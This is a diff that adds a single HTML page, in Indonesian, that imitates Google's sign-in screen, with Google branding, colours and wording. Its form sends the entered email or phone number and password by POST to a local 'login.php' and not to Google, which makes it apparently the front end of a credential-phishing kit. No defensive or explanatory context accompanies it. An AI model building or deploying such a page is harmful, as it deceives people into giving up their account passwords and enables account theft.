@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Google</title>
+  <style>
+    body { font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .container { width: 360px; padding: 20px; text-align: center; }
+    .logo { font-size: 32px; color: #4285f4; margin-bottom: 20px; }
+    input, .btn { width: 100%; padding: 12px; margin: 10px 0; border-radius: 4px; border: 1px solid #ccc; }
+    .btn { background: #1a73e8; color: white; border: none; cursor: pointer; }
+    .btn:hover { background: #155ab6; }
+    .link { color: #1a73e8; text-decoration: none; font-size: 14px; display: block; margin-top: 10px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">Google</div>
+    <h2>Login</h2>
+    <p>Gunakan Akun Google Anda.</p>
+    <form action="login.php" method="POST">
+      <input type="text" name="email" placeholder="Email atau nomor telepon" required>
+      <input type="password" name="password" placeholder="Kata sandi" required>
+      <input type="submit" class="btn" value="Selanjutnya">
+    </form>
+    <a href="#" class="link">Lupa email?</a>
+    <a href="#" class="link">Buat akun</a>
+  </div>
+</body>
+</html>
